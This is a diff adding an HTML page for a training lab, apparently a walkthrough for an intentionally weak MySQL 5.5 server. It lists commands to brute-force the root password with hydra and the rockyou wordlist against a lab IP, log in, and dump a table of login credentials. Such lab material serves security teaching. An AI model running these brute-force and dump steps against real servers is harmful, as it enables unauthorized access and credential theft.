@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>MySQL Walkthrough</title>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
+</head>
+<body class="bg-light">
+<div class="container mt-5">
+  <h2 class="mb-4 text-primary">Walkthrough: MySQL-vuln</h2>
+
+  <p>This lab uses a weakly configured MySQL 5.5 server that allows brute-force attacks. Your goal is to log in as root and explore the contents of a database named <code>enterpriseCredentials</code>.</p>
+
+  <div class="card mb-4">
+    <div class="card-header bg-warning text-dark">
+      Objective
+    </div>
+    <div class="card-body">
+      <p>Crack the root password and access sensitive login credentials in the database.</p>
+    </div>
+  </div>
+
+  <div class="card mb-4">
+    <div class="card-header bg-secondary text-white">
+      Step-by-Step Instructions
+    </div>
+    <div class="card-body">
+      <ol>
+        <li>Unzip the default wordlist:
+          <pre>gunzip /usr/share/wordlists/rockyou.txt.gz</pre>
+        </li>
+        <li>Use <code>hydra</code> to brute-force the root password:
+          <pre>hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://10.42.16.240</pre>
+        </li>
+        <li>Once cracked, use the credentials to log into MySQL:
+          <pre>mysql -u root -p -h 10.42.16.240</pre>
+        </li>
+        <li>View the available databases:
+          <pre>SHOW DATABASES;</pre>
+        </li>
+        <li>Use the target database:
+          <pre>USE enterpriseCredentials;</pre>
+        </li>
+        <li>View tables:
+          <pre>SHOW TABLES;</pre>
+        </li>
+        <li>Dump the credentials:
+          <pre>SELECT * FROM LoginCredentials;</pre>
+        </li>
+      </ol>
+    </div>
+  </div>
+
+  <a href="{% url 'dashboard' %}" class="btn btn-outline-primary">Back to Dashboard</a>
+</div>
+</body>
+</html>
